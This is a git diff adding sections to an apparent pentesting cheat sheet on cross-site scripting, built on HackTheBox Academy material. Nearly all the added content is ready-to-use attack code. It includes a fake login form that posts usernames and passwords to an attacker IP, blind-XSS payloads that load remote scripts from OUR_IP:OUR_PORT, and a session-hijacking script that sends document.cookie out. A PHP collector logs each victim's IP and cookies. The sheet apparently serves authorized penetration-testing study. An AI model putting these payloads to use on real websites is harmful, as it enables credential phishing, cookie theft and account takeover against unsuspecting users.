@@ -108,6 +108,19 @@ Main types of XSS :
 | Reflected (Non-Persistent) XSS                | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)                                               |
 | DOM-based XSS                  | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)  |
 
+**important payload**
+```html
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+<script>document.body.style.background = "#141d2b"</script>
+<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
+<script>document.title = 'HackTheBox Academy'</script>
+document.getElementById("todo").innerHTML = "New Text"
+document.getElementsByTagName('body')[0].innerHTML = "New Text"
+<script>alert(window.origin)</script>
+<script>alert(document.cookie)</script>
+```
+
+
 **XSS Discovery**  
 you can use automated tools like XSS Strike, Brute XSS, XSSer.
 ```bash
@@ -124,9 +137,49 @@ or manual discover
 ```
 
 **Dom based XSS**
-```
+```html
 <img src="" onerror=alert(window.origin)>
 #"><img src=/ onerror=alert(2)>
+```
+
+**Blind XSS**   
+A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to  
+Detect blind XSS :
+```html
+<script src="http://OUR_IP:OUR_PORT/username"></script> <!-- username here to know username field is vulnerable -->
+'><script src=http://OUR_IP:OUR_PORT/></script>
+"><script src=http://OUR_IP:OUR_PORT></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP:OUR_PORT\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP:OUR_PORT");a.send();</script>
+<script>$.getScript("http://OUR_IP:OUR_PORT")</script>
+```
+Listen with netcat or php and see if you have a request.
+
+**Hijacking sessions**  
+Create a script.js and a index.php in new folder.  
+script.js :  
+```javascript
+document.location='http://OUR_IP:OUR_PORT/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP:OUR_PORT/index.php?c='+document.cookie;
+```
+index.php :  
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+Now listen with netcat or php and uploads this payload  
+XSS :  
+```html
+<script src=http://OUR_IP:OUR_PORT/script.js></script>
 ```
 
 
